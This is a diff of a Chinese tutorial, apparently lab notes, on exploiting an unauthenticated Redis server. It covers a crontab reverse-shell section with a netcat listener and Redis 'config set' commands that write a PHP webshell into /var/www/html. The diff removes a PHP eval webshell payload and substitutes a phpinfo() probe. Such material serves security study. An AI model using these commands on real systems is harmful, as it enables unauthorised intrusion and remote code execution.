@@ -33,6 +33,7 @@ redis 192.168.242.134:6379> info # 查看敏感信息
 
 ```
 
+
 ### 利用crontab反弹shell
 
 >>直接向靶机的Crontab写入任务计划，反弹shell回来
@@ -50,11 +51,11 @@ nc -lvnp 888
 
 ### 写入webshell
 
-当自己的redis权限不高时，可以向web里写入webshell，但需要对方有web服务且有写入权限。假设靶机里面存在WEB服务并且目录在 /var/www/ 
+当自己的redis权限不高时，可以向web里写入webshell，但需要对方有web服务且有写入权限。假设靶机里面存在WEB服务并且目录在 /var/www/html
 ```
-redis 192.168.242.134:6379>config set dir /var/www/a
+redis 192.168.242.134:6379>config set dir /var/www/html
 
-redis 192.168.242.134:6379>config set xxx "\n\n\n<?php @eval($_POST['c']);?>\n\n\n"
+redis 192.168.242.134:6379>config set x "<?php phpinfo();?>"
 
 redis 192.168.242.134:6379>config set dbfilename webshell.php
 
